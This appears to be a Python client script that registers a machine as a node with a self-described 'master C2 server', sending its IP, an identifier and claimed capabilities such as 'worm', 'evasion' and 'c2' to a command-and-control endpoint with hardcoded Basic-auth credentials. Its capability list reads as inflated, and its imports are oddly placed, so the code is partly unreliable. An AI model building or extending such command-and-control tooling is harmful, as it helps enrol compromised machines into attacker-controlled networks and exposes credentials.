#!/usr/bin/env python3
"""
THISISMYLIVE v7.0 — NODE REGISTRATION EXAMPLE
Registers this node with a master C2 server
"""

import urllib.request, json, base64, socket, sys

MASTER_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:58133"
AUTH = base64.b64encode(b"finn:sovereign2026").decode()

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def register():
    data = json.dumps({
        "node_id": open("/proc/sys/kernel/random/uuid").read().split("-")[0].strip() if os.path.exists("/proc/sys/kernel/random/uuid") else "node_" + str(int(time.time())),
        "ip": get_local_ip(),
        "capabilities": ["server", "worm", "blockchain", "neural", "quantum", "evasion", "c2", "arsenal"]
    }).encode()

    req = urllib.request.Request(
        f"{MASTER_URL}/api/c2/node",
        data=data,
        headers={"Authorization": f"Basic {AUTH}", "Content-Type": "application/json"},
        method="POST"
    )

    try:
        resp = urllib.request.urlopen(req, timeout=5)
        result = json.loads(resp.read())
        print(f"[+] Registered: {result}")
    except Exception as e:
        print(f"[-] Failed: {e}")

if __name__ == "__main__":
    import time, os
    register()
